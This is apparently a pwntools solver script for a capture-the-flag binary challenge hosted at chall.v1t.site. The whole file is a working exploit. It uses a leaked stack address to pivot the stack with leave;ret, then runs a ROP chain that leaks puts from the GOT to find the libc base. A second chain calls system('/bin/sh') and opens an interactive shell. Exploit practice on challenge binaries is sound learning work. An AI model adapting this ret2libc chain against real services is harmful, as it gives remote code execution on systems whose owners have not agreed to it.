#!/usr/bin/env python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
rop = ROP(libc)

context.terminal = [
    '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', 
    '0', 'split-pane','-d', '.', 'wsl.exe','-d', 'Ubuntu', 'bash', '-c'
]

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        b*0x000000000040125a 

        c
        ''')
        input()

if args.REMOTE:
    p = remote('chall.v1t.site',30150)
elif args.DOCKER:
    p = remote('127.0.0.1')
else:
    p = process([exe.path])
GDB()

p.recvuntil(b'This may help: ')
buff = int(p.recvline(), 16)
print(f'buffer: {hex(buff)}')

pop_rdi = 0x401214
leave_ret = 0x401259

pl = p64(pop_rdi)
pl += p64(exe.got.puts)
pl += p64(exe.plt.puts)
pl += p64(exe.symbols.main)
pl += b'A' * (96 - len(pl))
pl += p64(buff-8) #rbp
pl += p64(leave_ret)

p.sendline(pl)

puts = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f'puts: {hex(puts)}')
libc_base = puts - libc.symbols.puts
system = libc_base + libc.symbols.system
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
print(f'libc base: {hex(libc_base)}')
print(f'system: {hex(system)}')
print(f'binsh: {hex(binsh)}')

p.recvuntil(b'This may help: ')
buff1 = int(p.recvline(), 16)
print(f'buffer1: {hex(buff1)}')

pl = p64(pop_rdi)
pl += p64(binsh)
pl += p64(0x40101a)
pl += p64(system)
pl += b'A' * (96 - len(pl))
pl += p64(buff1-8) #rbp
pl += p64(leave_ret)

p.sendline(pl)


p.interactive()
